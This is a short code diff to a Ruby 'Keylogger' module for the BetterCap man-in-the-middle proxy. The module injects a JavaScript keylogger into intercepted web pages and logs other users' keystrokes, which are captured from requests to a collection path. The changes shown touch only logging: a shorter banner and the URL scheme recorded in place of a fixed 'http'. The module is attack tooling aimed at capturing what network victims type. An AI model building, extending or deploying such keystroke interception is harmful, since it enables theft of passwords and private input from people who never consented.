@@ -46,7 +46,7 @@ class Keylogger < BetterCap::Proxy::HTTP::Module
 EOF
 
   def initialize
-    BetterCap::Logger.info "[#{'KEYLOGGER'.green}] " + "Injecting JS keylogger in unencrypted HTML files ..."
+    BetterCap::Logger.info "[#{'KEYLOGGER'.green}] " + "Injecting JS keylogger ..."
   end
 
   def on_request(request, response)
@@ -55,7 +55,7 @@ EOF
     if @req.include?("/#{@@destination}?")
       uri = URI.parse("#{@req}")
       keystroke = URI.unescape( uri.query )
-      BetterCap::Logger.raw "\e[1A[#{BetterCap::StreamLogger.addr2s(request.client)}] " + "KEYSTROKE".light_blue + " http://#{request.host} #{keystroke.yellow}\033[K"
+      BetterCap::Logger.raw "\e[1A[#{BetterCap::StreamLogger.addr2s(request.client)}] " + "KEYSTROKE".light_blue + " #{uri.scheme}://#{request.host} #{keystroke.yellow}\033[K"
       # "\e[1A[" overwrites previously printed line, "\033[K" removes remaining characters until end of new line
       # I probably should override a StreamLogger function to ignore keystroke packets, cause this ^ method only removes the previous line...
     end
